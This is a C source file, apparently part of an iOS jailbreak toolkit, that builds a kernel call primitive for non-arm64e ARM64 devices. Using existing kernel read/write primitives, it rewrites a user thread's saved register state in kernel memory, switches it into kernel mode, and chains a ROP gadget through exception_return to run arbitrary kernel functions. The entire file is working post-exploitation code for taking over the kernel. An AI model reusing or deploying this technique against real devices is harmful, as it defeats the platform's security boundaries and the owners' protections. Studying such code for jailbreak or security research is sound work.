#include "kcall_arm64.h"

#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"

// Reuse return logic from Fugu14_Kcall
// I don't like this as it breaks executing multiple threads at the same time
// But as we don't even really do/support that currently anyways, it doesn't matter
uint64_t getUserReturnThreadContext(void);
extern uint64_t gUserReturnDidHappen;

#ifndef __arm64e__

arm64KcallThread gArm64KcallThead;

void arm64_kexec_on_thread_locked(arm64KcallThread *callThread, kRegisterState *threadState)
{
	memcpy(callThread->alignedState, threadState, sizeof(*threadState));

	kRegisterState kcallBootstrapThreadState = { 0 };
	uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), callThread->thread);

	kcallBootstrapThreadState.pc = kgadget(str_x8_x0); // "str x8, [x0]", "ret" gadget
	kcallBootstrapThreadState.lr = ksymbol(exception_return);

	// Kptr to actual thread state that does kcall
	// We use the userland memory here to avoid allocating extra kernel memory

	// The ret of the "str x8, [x0]", "ret" gadget  will go to exception_return
	// which will execute the thread state in x21
	kcallBootstrapThreadState.x[21] = phystokv(vtophys(ttep_self(), (uint64_t)callThread->alignedState));

	// Make bootstrap thread set machine.kstackptr based on gadget
	kcallBootstrapThreadState.x[0] = callThread->kernelStack;
	kcallBootstrapThreadState.x[8] = threadKptr + koffsetof(thread, machine_kstackptr);

	// Change cpsr to EL0, to make the thread actually run in kernelspace
	// Interrupts have to be disabled until we have set up the stack, else this will cause random panics
	kcallBootstrapThreadState.cpsr = CPSR_KERN_INTR_DIS;

	kwritebuf(callThread->actContext, &kcallBootstrapThreadState, sizeof(kcallBootstrapThreadState));

	thread_resume(callThread->thread);
}

void arm64_kexec_on_thread(arm64KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	arm64_kexec_on_thread_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
}

void arm64_kcall_prepare_state(arm64KcallThread *callThread, kRegisterState *threadState, uint64_t returnContextKptr, uint64_t *returnStorage)
{
	threadState->x[19] = phystokv(vtophys(ttep_self(), (uint64_t)returnStorage));
	threadState->x[21] = returnContextKptr;

	threadState->lr = kgadget(kcall_return);
	threadState->sp = callThread->kernelStack - 0x20;
	kwrite64(threadState->sp +  0x0, 0);
	kwrite64(threadState->sp +  0x8, 0);
	kwrite64(threadState->sp + 0x10, 0);
	kwrite64(threadState->sp + 0x18, ksymbol(exception_return)); // kcall_return will load this into lr

	threadState->cpsr = CPSR_KERN_INTR_EN;
}

uint64_t arm64_kcall_on_thread(arm64KcallThread *callThread, uint64_t func, int argc, const uint64_t *argv)
{
	// Currently doesn't support more than 8 args
	// Not sure how trivial it would be to support due to kcall_return making some assumptions about the stack
	if (argc > 8) return -1;

	pthread_mutex_lock(&callThread->lock);

	uint64_t retValue = 0;

	kRegisterState threadState = { 0 };
	threadState.pc = func;
	for (int i = 0; i < argc; i++) {
		threadState.x[i] = argv[i];
	}
	arm64_kcall_prepare_state(callThread, &threadState, getUserReturnThreadContext(), &retValue);

	gUserReturnDidHappen = false;

	arm64_kexec_on_thread_locked(callThread, &threadState);

	while (!gUserReturnDidHappen) ;

	thread_suspend(callThread->thread);
	thread_abort(callThread->thread);

	pthread_mutex_unlock(&callThread->lock);

	return retValue;
}

void arm64_kexec(kRegisterState *threadState)
{
	arm64_kexec_on_thread(&gArm64KcallThead, threadState);
}

uint64_t arm64_kcall(uint64_t func, int argc, const uint64_t *argv)
{
	return arm64_kcall_on_thread(&gArm64KcallThead, func, argc, argv);
}

int arm64_kcall_init(void)
{
	if (!gPrimitives.kalloc_local) return -1;
	
	// When doing an OTA update from 2.0.x to >=2.1, we will not have offsets for kcall yet so we can't initialize it
	if (!koffsetof(thread, machine_contextData)) return -1;

	static dispatch_once_t ot;
	dispatch_once(&ot, ^{
		pthread_mutex_init(&gArm64KcallThead.lock, NULL);

		// Kcall thread
		// The thread that we make execute in kernelspace by ovewriting it's cpsr in kernel memory
		thread_create(mach_task_self_, &gArm64KcallThead.thread);
		uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), gArm64KcallThead.thread);
		gArm64KcallThead.actContext = kread_ptr(threadKptr + koffsetof(thread, machine_contextData));

		// In order to do kcalls, we need to make a kernel allocation that is used as the stack
		kalloc_with_options(&gArm64KcallThead.kernelStack, 0x10000, KALLOC_OPTION_LOCAL);
		gArm64KcallThead.kernelStack += 0x8000;

		// Aligned state, we write to this allocation and then we can get the kernel pointer from it to pass to exception_return
		posix_memalign((void **)&gArm64KcallThead.alignedState, vm_real_kernel_page_size, vm_real_kernel_page_size);
	});

	gPrimitives.kcall = arm64_kcall;
	gPrimitives.kexec = arm64_kexec;
	
	return 0;
}

#else

int arm64_kcall_init(void) { return -1; }

#endif